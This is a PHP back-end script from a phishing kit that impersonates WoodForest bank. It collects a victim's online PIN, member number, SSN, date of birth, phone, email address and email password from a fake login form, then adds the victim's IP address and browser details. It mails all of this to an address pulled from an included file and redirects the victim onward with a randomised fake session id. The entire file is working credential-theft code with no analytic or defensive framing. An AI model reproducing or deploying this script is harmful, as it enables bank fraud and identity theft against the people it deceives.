<?php
if($_POST["pn"] != "" and $_POST["mem"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------WoodForest Info-----------------------\n";
$message .= "Online PIN        : ".$_POST['pn']."\n";
$message .= "Member Number        : ".$_POST['mem']."\n";
$message .= "Name        : ".$_POST['name']."\n";
$message .= "Phone        : ".$_POST['phone']."\n";
$message .= "SSN        : ".$_POST['sn']."\n";
$message .= "Date of Birth        : ".$_POST['db']."\n";
$message .= "Email Address       : ".$_POST['eml']."\n";
$message .= "Email Password       : ".$_POST['eps']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf4.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>